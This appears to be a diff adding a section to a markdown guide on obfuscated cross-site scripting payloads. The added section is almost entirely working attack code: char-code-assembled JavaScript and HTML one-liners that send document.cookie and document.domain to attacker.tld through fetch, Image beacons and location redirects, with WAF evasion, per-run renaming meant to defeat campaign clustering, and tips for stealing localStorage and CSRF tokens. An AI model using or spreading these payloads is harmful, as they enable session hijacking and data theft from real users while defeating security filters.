@@ -216,6 +216,98 @@ window[АЬс](1);
 
 ---
 
+## Data Exfiltration Variants
+
+Same primitive extended to leak `document.cookie` and `document.domain`. The strings `document`, `cookie`, `domain`, `fetch`, `Image`, `src` never appear in the payload.
+
+Char-code cheat sheet:
+
+```
+document = 100,111,99,117,109,101,110,116
+cookie   = 99,111,111,107,105,101
+domain   = 100,111,109,97,105,110
+fetch    = 102,101,116,99,104
+Image    = 73,109,97,103,101
+src      = 115,114,99
+```
+
+### document.cookie via fetch
+
+```js
+書=String.fromCharCode(100,111,99,117,109,101,110,116);   // "document"
+菓=String.fromCharCode(99,111,111,107,105,101);            // "cookie"
+呼=String.fromCharCode(102,101,116,99,104);                // "fetch"
+window[呼]('//attacker.tld/?c='+window[書][菓]);
+```
+
+Tag-embeddable one-liner:
+
+```html
+<img src=x onerror="書=String.fromCharCode(100,111,99,117,109,101,110,116);菓=String.fromCharCode(99,111,111,107,105,101);呼=String.fromCharCode(102,101,116,99,104);window[呼]('//attacker.tld/?c='+window[書][菓])">
+```
+
+### document.cookie via Image beacon (works without fetch or CORS)
+
+```js
+書=String.fromCharCode(100,111,99,117,109,101,110,116);
+菓=String.fromCharCode(99,111,111,107,105,101);
+画=String.fromCharCode(73,109,97,103,101);
+源=String.fromCharCode(115,114,99);
+i=new window[画]();
+i[源]='//attacker.tld/?c='+window[書][菓];
+```
+
+Tag-embeddable:
+
+```html
+<svg><animate onbegin="書=String.fromCharCode(100,111,99,117,109,101,110,116);菓=String.fromCharCode(99,111,111,107,105,101);画=String.fromCharCode(73,109,97,103,101);源=String.fromCharCode(115,114,99);i=new window[画]();i[源]='//attacker.tld/?c='+window[書][菓]" attributeName=x dur=1s></svg>
+```
+
+### document.domain via alert (reflected PoC)
+
+```js
+書=String.fromCharCode(100,111,99,117,109,101,110,116);
+領=String.fromCharCode(100,111,109,97,105,110);
+呼=String.fromCharCode(97,108,101,114,116);
+window[呼](window[書][領]);
+```
+
+Tag-embeddable:
+
+```html
+<details open ontoggle="書=String.fromCharCode(100,111,99,117,109,101,110,116);領=String.fromCharCode(100,111,109,97,105,110);呼=String.fromCharCode(97,108,101,114,116);window[呼](window[書][領])"></details>
+```
+
+### document.domain exfil via location
+
+```js
+書=String.fromCharCode(100,111,99,117,109,101,110,116);
+領=String.fromCharCode(100,111,109,97,105,110);
+所=String.fromCharCode(108,111,99,97,116,105,111,110);   // "location"
+window[所]='//attacker.tld/?d='+window[書][領];
+```
+
+### Fully obfuscated exfil URL
+
+Attacker host also assembled from char codes if the WAF regexes literal URLs. `//attacker.tld/?c=` becomes:
+
+```js
+先=String.fromCharCode(47,47,97,116,116,97,99,107,101,114,46,116,108,100,47,63,99,61);
+書=String.fromCharCode(100,111,99,117,109,101,110,116);
+菓=String.fromCharCode(99,111,111,107,105,101);
+呼=String.fromCharCode(102,101,116,99,104);
+window[呼](先+window[書][菓]);
+```
+
+### Notes
+
+- Every property access is bracket-notation, every function call goes through a `window[…]` or `document[…]` lookup. No literal `document.cookie`, no literal `.src =`, no literal `fetch(`.
+- The variable identifiers (`書`, `菓`, `呼`, ...) are cosmetic. Rename each run so signature detection on Unicode identifier reuse cannot cluster campaigns.
+- `HttpOnly` cookies stay out of reach for `document.cookie` regardless of obfuscation. Target session cookies without the flag, or pivot to CSRF token theft, in-DOM secrets, `localStorage`, `sessionStorage` (same trick, sub `[菓]` for `[String.fromCharCode(108,111,99,97,108,83,116,111,114,97,103,101)]`).
+- Same-Origin exfil (attacker on the same origin via subdomain takeover) avoids CORS entirely: use `fetch` or `Image`, both work.
+
+---
+
 ## Credit
 
 Inspired by [`0x03f3/php-emoji-reverse-shell`](https://github.com/0x03f3/php-emoji-reverse-shell/blob/main/emoji-reverse-shell.php). Same trick in PHP: emoji identifiers plus char-code assembly to slip past AV and WAF signatures.
